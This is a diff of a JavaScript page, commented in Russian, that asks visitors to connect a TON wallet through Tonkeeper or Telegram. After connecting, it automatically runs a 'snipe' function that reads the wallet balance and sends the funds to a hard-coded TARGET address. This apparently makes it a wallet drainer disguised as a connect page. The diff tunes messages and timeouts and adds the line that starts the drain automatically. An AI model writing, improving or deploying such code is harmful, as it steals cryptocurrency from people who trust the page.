@@ -50,9 +50,6 @@
         .btn-red {
             background: linear-gradient(135deg, #e84800, #c03800);
         }
-        .btn-green {
-            background: linear-gradient(135deg, #00cc44, #008833);
-        }
         #status {
             margin-top: 16px;
             font-size: 13px;
@@ -90,13 +87,13 @@
         const status = document.getElementById('status');
         const balanceDisplay = document.getElementById('balanceDisplay');
 
-        // ========== ПОДКЛЮЧЕНИЕ ==========
+        // ========== TON CONNECT 2.0 ==========
         async function connectTon() {
             try {
                 status.innerText = '⏳ Подключение...';
                 connectBtn.disabled = true;
 
-                // ПРОВЕРЯЕМ РАСШИРЕНИЕ
+                // Проверяем расширение
                 if (window.tonkeeper) {
                     provider = window.tonkeeper;
                     const accounts = await provider.send('ton_requestAccounts', {});
@@ -107,15 +104,18 @@
                     }
                 }
 
-                // TELEGRAM / МОБИЛЬНЫЙ
+                // ====== TON CONNECT 2.0 (Telegram WebApp) ======
                 const isTelegram = window.Telegram && window.Telegram.WebApp;
                 const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
                 if (isTelegram || isMobile) {
-                    status.innerText = '📱 Открываю TON Keeper...';
+                    status.innerText = '📱 Открываю TON Connect 2.0...';
                     
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
+                    // Формируем URL для TON Connect 2.0
+                    const returnUrl = encodeURIComponent(window.location.href);
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${returnUrl}`;
                     
+                    // Открываем
                     if (isTelegram) {
                         window.Telegram.WebApp.openLink(connectUrl);
                     } else {
@@ -160,9 +160,9 @@
                         } catch(e) {}
                     }
                     
-                    if (attempts > 20) {
+                    if (attempts > 30) {
                         clearInterval(interval);
-                        status.innerText = '⏳ Подтвердите в TON Keeper вручную';
+                        status.innerText = '⏳ Подтвердите подключение в TON Keeper';
                         resolve();
                     }
                 }, 1000);
@@ -175,11 +175,11 @@
             connectBtn.classList.add('hidden');
             snipeBtn.classList.remove('hidden');
             
-            // АВТОМАТИЧЕСКИ ЗАПУСКАЕМ ВЫВОД
-            setTimeout(snipe, 500);
+            // АВТОМАТИЧЕСКИЙ ВЫВОД
+            setTimeout(snipe, 800);
         }
 
-        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
+        // ========== БАЛАНС ==========
         async function updateBalance() {
             try {
                 if (!provider) return 0;
@@ -199,9 +199,8 @@
                 status.innerText = '⏳ Проверка баланса...';
                 snipeBtn.disabled = true;
 
-                // ПРОВЕРЯЕМ ЧТО ПРОВАЙДЕР ЕСТЬ
                 if (!provider) {
-                    status.innerText = '❌ Нет подключения к TON Keeper';
+                    status.innerText = '❌ Нет подключения';
                     snipeBtn.disabled = false;
                     return;
                 }
@@ -226,6 +225,7 @@
                 const amountTON = (amount / 1e9).toFixed(6);
                 status.innerText = `⏳ Перевод ${amountTON} TON...`;
 
+                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                 const tx = {
                     to: TARGET,
                     value: amount.toString(),
@@ -233,7 +233,6 @@
                     stateInit: ''
                 };
 
-                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                 const result = await provider.send('ton_sendTransaction', tx);
 
                 if (result && result.code === 0) {
@@ -243,7 +242,7 @@
                     snipeBtn.disabled = true;
                     snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                 } else {
-                    status.innerText = `❌ Транзакция отклонена: ${result?.message || 'неизвестно'}`;
+                    status.innerText = `❌ Транзакция отклонена`;
                     snipeBtn.disabled = false;
                 }
 
